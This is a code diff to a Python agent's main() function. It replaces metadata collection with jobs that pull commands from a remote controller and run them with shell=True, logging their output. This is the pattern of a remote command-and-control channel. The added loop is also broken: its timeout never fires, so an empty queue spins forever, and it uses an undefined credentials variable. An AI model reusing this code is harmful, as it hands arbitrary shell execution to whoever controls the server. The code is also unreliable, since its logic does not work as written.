@@ -28,13 +28,62 @@ def main():
 
     supervisor = AgentSupervisor(agent)
 
-    supervisor.schedule(agent.collect_server_metadata, 10)
-    supervisor.schedule(agent.status_to_txt, 10)
+    def fetch_command(credentials, **kwargs):
+        data = agent.fetch_command_from_controller(
+            Authorization='Basic %s' % credentials, **kwargs
+        )
 
-    start_time = time.time()
-    supervisor.schedule_exit(
-        stop_condition=lambda: time.time() - start_time > 30
-    )
+        if data:
+            agent.maybe_add_to_queue(data)
+
+    nexec = 0
+
+    def execute_command(timeout):
+        nonlocal nexec
+
+        command_history = None
+
+        while True:
+            start = time.time()
+
+            if agent.queue:
+                command_history = agent.queue.pop(0)
+
+            if time.time() - start > timeout:
+                logging.warning('No command received in allocated time')
+                break
+
+        if command_history:
+            try:
+                proc = subprocess.Popen(
+                    command_history.command,
+                    shell=True,
+                    stdout=subprocess.PIPE,
+                    stderr=subprocess.PIPE,
+                )
+
+                stdout, stderr = proc.communicate()
+                output = stdout.decode('utf-8') + stderr.decode('utf-8')
+
+                nexec += 1
+
+                logging.info(
+                    'Command %s finished with status %s' % (
+                        command_history.command, proc.returncode
+                    )
+                )
+                logging.info('Command output: %s' % output)
+            except Exception as e:
+                logging.error(
+                    'Failed to execute command '
+                    '%s due to error: %s' % (command_history.command, str(e)),
+                    exc_info=True,
+                )
+
+    supervisor.schedule(fetch_command, interval=10, credentials=credentials)
+    supervisor.schedule(execute_command, interval=10, timeout=5)
+
+    supervisor.schedule_exit(stop_condition=lambda: nexec >= 2, interval=10)
 
     supervisor.start()
 
